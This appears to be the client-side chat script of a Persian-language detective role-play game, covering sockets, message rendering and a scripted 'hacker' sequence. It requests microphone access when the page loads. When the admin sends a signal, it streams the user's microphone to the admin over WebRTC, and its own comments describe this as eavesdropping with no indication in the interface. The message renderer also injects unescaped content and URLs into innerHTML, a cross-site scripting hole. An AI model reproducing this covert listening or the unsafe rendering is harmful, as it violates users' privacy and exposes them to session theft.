/**
 * public/assets/js/user-chat.js
 * منطق صفحه چت کاربر (دستیاران کارآگاه)
 */

let socket = null;
let userToken = sessionStorage.getItem('userToken');
let sessionData = JSON.parse(sessionStorage.getItem('userSession') || '{}');
let localStream = null;
let peerConnection = null;

// کانفیگ WebRTC (اتصال مستقیم به صورت P2P local بدون نیاز به STUN خارچی پولی)
const rtcConfig = {
  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
};

// اگر توکن یا اطلاعات جلسه وجود نداشت، هدایت به لندینگ
if (!userToken || !sessionData.id) {
  window.location.href = '/index.html';
}

document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('session-title').innerText = sessionData.name || 'دستیاران کارآگاه';
  document.getElementById('session-code-display').innerText = `> CODE: ${sessionData.code}`;

  // درخواست یک‌باره دسترسی میکروفون قبل از شروع جلسه جهت جلوگیری از نمایش مجدد پرمپت در طول بازی
  initUserMicrophone();
  loadHistory();
  initSocket();
});

async function initUserMicrophone() {
  try {
    localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    console.log('🎙️ دسترسی میکروفون لپ‌تاپ کاربر با موفقیت تایید شد.');
  } catch (err) {
    console.warn('⚠️ عدم دسترسی به میکروفون یا رد شدن پرمیشن:', err);
  }
}

// بارگذاری تاریخچه پیام‌های قبلی
async function loadHistory() {
  try {
    const res = await fetch(`/api/sessions/${sessionData.id}/messages`, {
      headers: {
        'Authorization': `Bearer ${userToken}`,
      },
    });
    const data = await res.json();
    if (data.success) {
      const box = document.getElementById('messages-box');
      box.innerHTML = '';
      data.data.forEach(renderMessage);
    }
  } catch (err) {
    console.error('Error loading history:', err);
  }
}

// مقداردهی اولیه سوکت
function initSocket() {
  socket = io({
    auth: { token: userToken },
  });

  const statusEl = document.getElementById('socket-status');

  socket.on('connect', () => {
    statusEl.className = 'status-indicator online';
    statusEl.innerHTML = '<span class="status-dot"></span> متصل به روم عملیاتی';
    socket.emit('join_session', { sessionId: sessionData.id });
  });

  socket.on('disconnect', () => {
    statusEl.className = 'status-indicator offline';
    statusEl.innerHTML = '<span class="status-dot"></span> قطع اتصال';
  });

  socket.on('new_message', (msg) => {
    renderMessage(msg);
  });

  socket.on('user_typing', (data) => {
    const typingEl = document.getElementById('typing-indicator');
    if (data.senderType === 'admin') {
      typingEl.innerText = data.isTyping ? 'ادمین مرکز در حال تایپ است...' : '';
    }
  });

  socket.on('error_message', (data) => {
    alert(data.message);
  });

  socket.on('hack_sequence_triggered', (data) => {
    console.log('🚨 رویداد سکانس هک مزداک دریافت شد:', data);
    if (typeof hackEngine !== 'undefined') {
      hackEngine.start();
    }
  });

  // دریافت درخواست شروع استریم صدای میکروفون توسط ادمین
  socket.on('audio_stream_started', async (data) => {
    console.log('🎙️ ادمین درخواست شنود صدای میکروفون را ارسال کرد:', data);
    await startPeerConnection(data.adminSocketId);
  });

  socket.on('audio_stream_stopped', () => {
    console.log('🛑 استریم صدای میکروفون توسط ادمین قطع گردید.');
    stopPeerConnection();
  });

  socket.on('webrtc_answer', async (data) => {
    if (peerConnection) {
      await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
    }
  });

  socket.on('webrtc_ice_candidate', async (data) => {
    if (peerConnection && data.candidate) {
      try {
        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
      } catch (e) {
        console.error('Error adding ICE candidate:', e);
      }
    }
  });
}

// نمایش پیام در چت‌باکس
function renderMessage(msg) {
  const box = document.getElementById('messages-box');
  const div = document.createElement('div');
  div.className = `message-bubble ${msg.sender_type}`;

  let senderTitle = 'دستیاران کارآگاه';
  if (msg.sender_type === 'admin') senderTitle = msg.admin_sender_name || 'مرکز ادمین';
  if (msg.sender_type === 'system') senderTitle = 'پیام سیستم';
  if (msg.sender_type === 'hacker') senderTitle = '☠️ شبکه هکر';

  let bodyContent = msg.content;
  if (msg.message_type === 'image') {
    bodyContent = `<div>${msg.content}</div><img src="${msg.file_url || msg.content}" style="max-width:100%; border-radius:6px; margin-top:8px; border:1px solid var(--neon-cyan);">`;
  } else if (msg.message_type === 'voice') {
    bodyContent = `<div>🔊 فایل صوتی: ${msg.content}</div><audio controls src="${msg.file_url || msg.content}" style="width:100%; margin-top:8px;"></audio>`;
  } else if (msg.message_type === 'file') {
    bodyContent = `<div>📁 فایل پیوست: <a href="${msg.file_url || '#'}" target="_blank" style="color:var(--neon-cyan); font-weight:bold;">${msg.file_name || 'دانلود فایل'}</a></div><div>${msg.content}</div>`;
  }

  div.innerHTML = `
    <div class="message-sender">
      <span>${senderTitle}</span>
      <span>${new Date(msg.created_at).toLocaleTimeString('fa-IR', { hour: '2-digit', minute: '2-digit' })}</span>
    </div>
    <div>${bodyContent}</div>
  `;

  box.appendChild(div);
  box.scrollTop = box.scrollHeight;
}

// ارسال پیام جدید
function sendMessage() {
  const input = document.getElementById('msg-input');
  const typeSelect = document.getElementById('msg-type-select');
  const content = input.value.trim();

  if (!content) return;

  socket.emit('send_message', {
    sessionId: sessionData.id,
    content: content,
    messageType: typeSelect.value,
    fileUrl: typeSelect.value !== 'text' ? content : null,
  });

  input.value = '';
  sendTypingStatus(false);
}

// مدیریت وضعیت تایپینگ
let typingTimeout = null;
function handleTyping() {
  sendTypingStatus(true);
  clearTimeout(typingTimeout);
  typingTimeout = setTimeout(() => {
    sendTypingStatus(false);
  }, 2500);
}

function sendTypingStatus(isTyping) {
  if (socket) {
    socket.emit('typing', { sessionId: sessionData.id, isTyping });
  }
}

// ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
async function startPeerConnection(adminSocketId) {
  stopPeerConnection();

  if (!localStream) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    } catch (err) {
      console.error('عدم دسترسی به میکروفون:', err);
      return;
    }
  }

  peerConnection = new RTCPeerConnection(rtcConfig);

  // افزودن ترک‌های صدای میکروفون
  localStream.getAudioTracks().forEach(track => {
    peerConnection.addTrack(track, localStream);
  });

  // ارسال ICE Candidates به ادمین
  peerConnection.onicecandidate = (event) => {
    if (event.candidate) {
      socket.emit('webrtc_ice_candidate', {
        sessionId: sessionData.id,
        candidate: event.candidate,
        targetSocketId: adminSocketId,
      });
    }
  };

  // ساخت Offer و ارسال به ادمین
  try {
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);

    socket.emit('webrtc_offer', {
      sessionId: sessionData.id,
      offer: offer,
      targetSocketId: adminSocketId,
    });
  } catch (err) {
    console.error('خطا در ساخت WebRTC offer:', err);
  }
}

function stopPeerConnection() {
  if (peerConnection) {
    peerConnection.close();
    peerConnection = null;
  }
}

function logoutUser() {
  sessionStorage.removeItem('userToken');
  sessionStorage.removeItem('userSession');
  window.location.href = '/index.html';
}
